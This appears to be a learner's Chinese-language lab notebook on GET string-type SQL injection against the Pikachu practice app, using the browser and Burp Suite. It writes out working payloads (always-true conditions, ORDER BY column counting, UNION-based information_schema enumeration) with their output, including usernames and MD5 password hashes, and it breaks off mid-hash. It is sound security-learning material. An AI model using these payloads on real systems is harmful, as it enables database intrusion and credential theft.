

### 在burpsuite上可以很清楚看見
* get 型和post型的差別在於空格 url get的參數碰到空格就會斷掉所以需要變成%20 或是+號
* post的不會。




### 先猜測大概長這樣
```
select username where username='admin' 
```

```
http://pika/vul/sqli/sqli_str.php?name='111111111111111'&submit=%E6%9F%A5%E8%AF%A2
```



---------------------------------------------------------


```
字串型
在瀏覽器可以成功BP不可
http://pika/vul/sqli/sqli_str.php?name=1' or '1&submit=%E6%9F%A5%E8%AF%A2

在瀏覽器可以成功BP不可
http://pika/vul/sqli/sqli_str.php?name=1' or '1' --+ &submit=%E6%9F%A5%E8%AF%A2

兩者都可 (我使用#號需要轉碼%23)
http://pika/vul/sqli/sqli_str.php?name=1'+or+'1'+%23&submit=%E6%9F%A5%E8%AF%A2
```

### 爆出 id 和 email
```

your uid:1
your email is: 1111111111111

your uid:2
your email is: allen@pikachu.com

your uid:3
your email is: kobe@pikachu.com

your uid:4
your email is: grady@pikachu.com

your uid:5
your email is: kevin@pikachu.com

your uid:6
your email is: lucy@pikachu.com

your uid:7
your email is: lili@pikachu.com
```


### 總之根據上面經驗，get型在構造的時候直接用瀏覽器會比BP來的方便。
* 非要使用BP也不是不可以，空格替換+或%20就可以了。

* 最後小提示: 
1. 註釋符能夠使用`--+` 就不要使用`#號 轉 %23`
1. 這樣更方便閱讀





---


### 如果有開啟錯誤顯示，這招判斷sql語句欄位數很好用

`+` 和 `%20` 都是用於表示空格的字符轉義方式

```
這個有空個的直接放URL 瀏覽器會把空格和特殊字轉碼
http://pika/vul/sqli/sqli_str.php?name=1' ORDER BY 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79,80,81,82,83,84,85,86,87,88,89,90,91,92,93,94,95,96,97,98,99,100--+
&submit=%E6%9F%A5%E8%AF%A2


瀏覽器變成以下
1%27%20ORDER%20BY%201,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79,80,81,82,83,84,85,86,87,88,89,90,91,92,93,94,95,96,97,98,99,100--+




如果想在BP上使用 +號會比較清楚
http://pika/vul/sqli/sqli_str.php?name=1'+ORDER+BY+1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79,80,81,82,83,84,85,86,87,88,89,90,91,92,93,94,95,96,97,98,99,100--+
```

顯示:
```
Unknown column '3' in 'order clause'
代表欄位三出現錯誤，所以sql語句只有兩個欄位
```


### union 驗證:

```
兩個欄位 正確
http://pika/vul/sqli/sqli_str.php?name=1' UNION SELECT 1,2--+&submit=%E6%9F%A5%E8%AF%A2

三個欄位 錯誤
http://pika/vul/sqli/sqli_str.php?name=1' UNION SELECT 1,2,3--+&submit=%E6%9F%A5%E8%AF%A2

```



### 剩下的注入就跟前面都差不多

* 所有數據庫
```
1'+UNION+SELECT+@,+gRoUp_cOncaT(0x7c,schema_name,0x7c)+fRoM+information_schema.schemata--+


|information_schema|,|a_com__phpcmsv9|,|dvwa|,|my_db|,|mysql|,|performance_schema|,|phpcmsv9|,|phpcmsv9123123|,|pikachu|,|sys|,|test002|,|wp1|
```

* pikachu數據庫中的表
```

1'+UniOn+Select+@,+gRoUp_cOncaT(0x7c,table_name,0x7C)+fRoM+information_schema.tables+wHeRe+table_schema='pikachu'--+

|httpinfo|,|member|,|message|,|users|,|xssblind|
```



* member表中的欄位
```
1'+UniOn+Select+@,+gRoUp_cOncaT(0x7c,column_name,0x7C)+fRoM+information_schema.columns+wHeRe+table_name='member'--+


|id|,|username|,|pw|,|sex|,|phonenum|,|address|,|email|
```


* member欄位中的帳戶
```
1' UniOn Select @,gRoUp_cOncaT(0x7c,username,0x7C)+fRoM+member--+


|vince|,|allen|,|kobe|,|grady|,|kevin|,|lucy|,|lili|,|123|,|123|,|456|,|123|,|11111111|,|22222222|,|1111|,|123|,|456|,|1111|,|77777|
```


* member欄位中的密碼
```
1' UniOn Select @,gRoUp_cOncaT(0x7c,pw,0x7C)+fRoM+member--+

|e10adc3949ba59abbe56e057f20f883e|,|e10adc3949ba59abbe56e057f20f883e|,|e10adc3949ba59abbe56e057f20f883e|,|e10adc3949ba59abbe56e057f20f883e|,|e10adc3949ba59abbe56e057f20f883e|,|e10adc3949ba59abbe56e057f20f883e|,|e10adc3949ba59abbe56e057f20f883e|,|202cb962ac59075b964b07152d234b70|,|202cb962ac59075b964b07152d234b70|,|250cf8b51c773f3f8dc8b4be8
```













